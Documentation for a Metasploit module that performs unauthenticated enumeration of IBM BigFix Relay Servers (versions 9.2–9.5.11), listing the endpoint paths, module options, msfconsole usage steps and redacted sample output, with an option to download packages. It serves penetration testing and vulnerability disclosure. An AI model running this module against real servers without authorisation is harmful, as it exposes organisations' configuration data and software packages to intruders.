## Description

This module performs unauthenticated requests to retrieve masthead, sites, and packages information from IBM BigFix Relay Servers. If the **DOWNLOAD** option is set then the module will attempt to download the identified packages. This module has been tested against Relay Server 9.5.10.79.

## Vulnerable Application

BigFix Platform 9.2 - 9.2.16 and 9.5 - 9.5.11

## Options

**SHOW_MASTHEAD**

Default: true. Read Organization name from `/masthead/masthead.axfm`

**SHOW_PACKAGES**

Default true. Read Action values and packages names from `/cgi-bin/bfenterprise/BESMirrorRequest.exe`

**SHOW_SITES**

Default true. Read Site URLs from `/cgi-bin/bfenterprise/clientregister.exe?RequestType=FetchCommands`

**DOWNLOAD**

Default true. Attempt to download identified packages.

**ShowURL**

Default false. Show full URL for the packages instead of the filename.

## Verification Steps

1. `./msfconsole -q`
2. `use auxiliary/gather/ibm_bigfix_sites_packages_enum`
3. `set rhosts <rhost>`
4. `exploit`

## Scenarios

### Relay Version 9.5.10.79

```
msf5 > use auxiliary/gather/ibm_bigfix_sites_packages_enum
msf5 auxiliary(gather/ibm_bigfix_sites_packages_enum) > set rhosts <rhost>
rhosts => <rhost>
msf5 auxiliary(gather/ibm_bigfix_sites_packages_enum) > exploit
[*] Running module against [IP]

[+] [Organization]
[+] http://[hostname]:52311/cgi-bin/bfgather.exe/actionsite
[+] http://[hostname]:52311/cgi-bin/bfenterprise/PostResults.exe
<snip>
[*] Sites
[+] http://[hostname]:52311/cgi-bin/bfgather.exe/[site]
[+] http://[hostname]:52311/cgi-bin/bfgather.exe/[site]
[+] http://[hostname]:52311/cgi-bin/bfgather.exe/[site]
<snip>
[*] Packages
[*] Action: [action number]
[+] File: [package name]
[*] Action: [action number]
[+] File: [package name]
<snip>
[*] Auxiliary module execution completed
msf5 auxiliary(gather/ibm_bigfix_sites_packages_enum) >
```
